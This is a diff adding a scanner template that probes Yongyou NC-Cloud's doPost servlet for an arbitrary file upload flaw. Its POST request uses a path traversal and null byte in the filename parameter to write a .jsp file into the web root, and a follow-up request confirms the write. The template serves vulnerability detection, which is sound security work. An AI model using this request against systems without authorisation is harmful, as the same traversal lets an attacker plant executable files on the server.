@@ -1,0 +1,51 @@
+id: poc-yaml-yongyou-nc-cloud-doPost-anyfile-upload
+
+info:
+  name: Yongyou NC-Cloud doPost Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in Yongyou NC-Cloud's `doPost` endpoint, allowing attackers to upload files to arbitrary locations on the server.
+
+variables:
+  t1: '{{rand_text_alphanumeric(4)}}'
+  t2: '{{base64(t1)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: attempt-upload
+    method: POST
+    path:
+      - "/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{t1}}.jsp%00"
+    headers:
+      Content-Type: application/octet-stream
+    body: '{{t2}}'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "xml version=\"1.0\""
+      - type: word
+        part: header
+        words:
+          - "text/html"
